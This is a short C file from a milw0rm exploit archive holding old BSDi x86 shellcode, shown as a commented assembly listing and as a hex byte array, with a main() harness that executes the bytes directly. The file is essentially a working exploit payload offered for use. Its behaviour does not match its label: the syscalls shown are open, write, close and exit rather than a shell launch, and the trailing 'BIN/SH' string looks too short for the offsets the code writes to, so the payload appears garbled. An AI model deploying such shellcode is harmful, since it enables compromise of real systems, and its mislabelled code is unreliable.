/*
	BSDi shellcode

	jmp    0x57
	pop    %esi
	xor    %ebx,%ebx
	add    $0x8,%ebx
	add    $0x2,%ebx
	mov    %bl,0x26(%esi)
	xor    %ebx,%ebx
	add    $0x23,%ebx
	add    $0x23,%ebx
	mov    %bl,0xffffffa8(%esi)
	xor    %ebx,%ebx
	add    $0x26,%ebx
	add    $0x30,%ebx
	mov    %bl,0xffffffc2(%esi)
	xor    %eax,%eax
	mov    %al,0xb(%esi)
	mov    %esi,%ebx
	add    $0x5,%eax
	xor    %ecx,%ecx
	add    $0x1,%ecx
	xor    %edx,%edx
	int    $0x80
	mov    %eax,%ebx
	xor    %eax,%eax
	add    $0x4,%eax
	xor    %edx,%edx
	mov    %dl,0x27(%esi)
	mov    %esi,%ecx
	add    $0xc,%ecx
	add    $0x1b,%edx
	int    $0x80
	xor    %eax,%eax
	add    $0x6,%eax
	int    $0x80
	xor    %eax,%eax
	add    $0x1,%eax
	int    $0x80
	.string	"BIN/SH"
*/

char code[] =
  "\xeb\x57\x5e\x31\xdb\x83\xc3\x08\x83\xc3\x02\x88\x5e"
  "\x26\x31\xdb\x83\xc3\x23\x83\xc3\x23\x88\x5e\xa8\x31"
  "\xdb\x83\xc3\x26\x83\xc3\x30\x88\x5e\xc2\x31\xc0\x88"
  "\x46\x0b\x89\xf3\x83\xc0\x05\x31\xc9\x83\xc1\x01\x31"
  "\xd2\xcd\x80\x89\xc3\x31\xc0\x83\xc0\x04\x31\xd2\x88"
  "\x56\x27\x89\xf1\x83\xc1\x0c\x83\xc2\x1b\xcd\x80\x31"
  "\xc0\x83\xc0\x06\xcd\x80\x31\xc0\x83\xc0\x01\xcd\x80"
  "BIN/SH";

main()
{
  int (*f)();
  f = (int (*)()) code;
  printf("BSDi old shellcode, %d bytes\n", strlen(code));
  (int)(*f)();
}

// milw0rm.com [2004-09-26]